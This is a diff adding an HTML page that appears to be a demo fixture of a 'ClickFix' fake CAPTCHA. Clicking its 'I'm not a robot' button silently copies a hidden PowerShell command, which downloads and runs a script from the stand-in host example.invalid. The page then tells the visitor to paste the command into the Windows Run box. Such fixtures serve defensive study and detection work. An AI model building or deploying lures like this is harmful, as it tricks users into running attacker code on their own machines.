@@ -1,0 +1,27 @@
+<!doctype html>
+<!-- Demo fixture: "ClickFix" fake CAPTCHA. Served as captcha-verify-human.online.
+     The copied command points at example.invalid and is never run by anything here. -->
+<html><head><meta charset="utf-8"><title>Just a moment... Verify you are human</title></head>
+<body style="font-family:sans-serif;max-width:520px;margin:60px auto;text-align:center">
+<h1>Verify you are human</h1>
+<p>Complete the verification steps to continue.</p>
+<button id="verify" style="font-size:18px;padding:12px 24px">☐ I'm not a robot</button>
+<ol id="steps" style="display:none;text-align:left;margin-top:24px">
+  <li>Press Windows + R</li><li>Press Ctrl + V</li><li>Press Enter</li>
+</ol>
+<script>
+  document.getElementById('verify').addEventListener('click', async () => {
+    const cmd = 'powershell -w hidden -c "iwr https://example.invalid/verify.ps1 | iex" # I am not a robot - Cloudflare ID 8842';
+    // Like real kits: modern API on HTTPS, hidden-textarea + execCommand('copy') otherwise.
+    if (navigator.clipboard) {
+      try { await navigator.clipboard.writeText(cmd); } catch (e) { console.log('clipboard', e); }
+    } else {
+      const t = document.createElement('textarea');
+      t.value = cmd; t.style.position = 'fixed'; t.style.opacity = '0';
+      document.body.appendChild(t); t.focus(); t.select();
+      document.execCommand('copy'); t.remove();
+    }
+    document.getElementById('steps').style.display = 'block';
+  });
+</script>
+</body></html>
